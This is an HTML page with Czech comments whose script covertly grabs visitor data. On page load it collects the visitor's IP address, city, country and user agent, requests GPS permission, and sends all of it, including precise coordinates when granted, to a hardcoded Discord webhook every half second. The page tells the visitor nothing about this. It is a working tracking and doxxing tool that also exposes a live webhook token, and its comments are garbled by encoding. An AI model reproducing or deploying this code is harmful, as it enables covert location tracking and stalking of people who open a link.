<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolokace</title>
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1334918135857287268/WDn0O_tSSKD3MLk-bufiwVHND9YgkexGKMsXG7guC6RKacjmxV-fvuC7EcNpu7LTGddE"; // Tv콢j webhook

        let gpsConfirmed = false; // Indik치tor pro potvrzenou GPS

        // Funkce pro z칤sk치n칤 informac칤 o za콏칤zen칤 a IP
        function getDeviceAndIP() {
            let device = navigator.userAgent; // Detekce za콏칤zen칤
            let vpnStatus = "VPN: FALSE"; // Defaultn캩 nastav칤me VPN jako FALSE

            // Z칤sk치n칤 IP a informac칤 o VPN
            fetch("https://ipinfo.io/json")
            .then(response => response.json())
            .then(data => {
                // Zji코t캩n칤, zda je pou쮂셨치na VPN (v tomto p콏칤pad캩 dle informac칤 z ipinfo.io)
                if (data.org && data.org.includes("VPN")) {
                    vpnStatus = "VPN: TRUE";
                }

                // Vytvo콏en칤 zpr치vy s informacemi o za콏칤zen칤 a VPN
                const message = `游님 Za콏칤zen칤: ${device}\n游깴 IP Adresa: ${data.ip} (M캩sto: ${data.city}, Zem캩: ${data.country})\n${vpnStatus}`;

                // Pokud je GPS potvrzena, p콏id치me GPS data
                if (gpsConfirmed) {
                    navigator.geolocation.getCurrentPosition(position => {
                        const lat = position.coords.latitude.toFixed(6);
                        const lon = position.coords.longitude.toFixed(6);
                        sendToDiscord(`${message}\n游늸 GPS: ${lat}, ${lon}`);
                    }, () => {
                        // Pokud GPS nen칤 dostupn치, po코leme zpr치vu bez GPS
                        sendToDiscord(message);
                    });
                } else {
                    // Pokud GPS nen칤 potvrzena, po코leme zpr치vu bez GPS
                    sendToDiscord(message);
                }
            })
            .catch(error => console.error("Chyba z칤sk치n칤 IP:", error));
        }

        // Funkce pro odesl치n칤 zpr치vy na Discord
        function sendToDiscord(message) {
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: message })
            }).catch(error => console.error("Chyba odes칤l치n칤:", error));
        }

        // Funkce pro spu코t캩n칤 odes칤l치n칤 ka쬯칳ch 0,5 sekundy
        function startSending() {
            setInterval(getDeviceAndIP, 500); // Odes칤l치n칤 ka쬯칳ch 500ms (0,5 sekundy)
        }

        // Funkce pro zji코t캩n칤 GPS
        function requestGPSPermission() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(() => {
                    gpsConfirmed = true; // Pokud u쬴vatel potvrd칤 GPS, nastav칤me flag
                    sendToDiscord("游늸 GPS potvrzena.");
                }, () => {
                    gpsConfirmed = false; // Pokud GPS zam칤tne, nastav칤me flag
                    sendToDiscord("游뛂 GPS zam칤tnuta.");
                });
            } else {
                gpsConfirmed = false;
                sendToDiscord("游뛂 GPS nen칤 podporov치na.");
            }
        }

        // Spu코t캩n칤 funkce p콏i na캜ten칤 str치nky
        window.onload = function() {
            startSending(); // Za캜neme pos칤lat informace ka쬯칳ch 0,5 sekundy
            requestGPSPermission(); // Po쮂멳치me o potvrzen칤 GPS
        };
    </script>
